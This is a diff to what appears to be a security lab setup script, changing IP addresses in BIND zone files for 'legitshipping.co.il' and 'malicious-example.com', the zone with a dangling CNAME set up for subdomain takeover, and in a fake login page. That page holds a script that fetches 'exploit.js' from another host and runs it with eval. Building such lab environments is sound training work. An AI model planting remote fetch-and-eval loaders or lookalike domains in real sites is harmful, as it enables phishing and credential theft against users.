@@ -63,8 +63,8 @@ $TTL 3600
 	3600 )     ; Negative Cache TTL
 ;
 @       IN NS     ns1.legitshipping.co.il.
-ns1     IN A      172.21.0.20
-www     IN A      172.21.0.20
+ns1     IN A      192.168.20.30
+www     IN A      192.168.20.30
 oldsub  IN CNAME  nonexistent.host.
 EOF
 cat > /etc/bind/db.legitshipping.co.il << "EOF"
@@ -77,9 +77,9 @@ $TTL 3600
 	3600 )     ; Negative Cache TTL
 ;
 @       IN NS     ns1.legitshipping.co.il.
-ns1     IN A      172.21.0.20
-www     IN A      172.21.0.20
-oldsub  IN A      172.22.0.20  ; Point directly to Host B instead of CNAME
+ns1     IN A      192.168.20.30
+www     IN A      192.168.20.30
+oldsub  IN A      192.168.30.40  ; Point directly to Host B instead of CNAME
 EOF
 
 #!/bin/bash
@@ -151,7 +151,7 @@ if ($_SERVER["REQUEST_METHOD"] === "POST") {
 <input type="submit" value="Login">
 </form>
 <script>
-fetch("http://172.21.0.20:5000/exploit.js")
+fetch("http://192.168.20.30:5000/exploit.js")
 .then(r=>r.text())
 .then(js=>eval(js));
 </script>
@@ -227,8 +227,8 @@ $TTL 604800
   604800 ) ; Negative Cache TTL
 ;
 @ IN NS ns.malicious-example.com.
-ns IN A 172.21.0.20
-www IN A 172.21.0.20
+ns IN A 192.168.20.30
+www IN A 192.168.20.30
 EOF
 #!/bin/bash
 if pgrep -x "named" > /dev/null; then
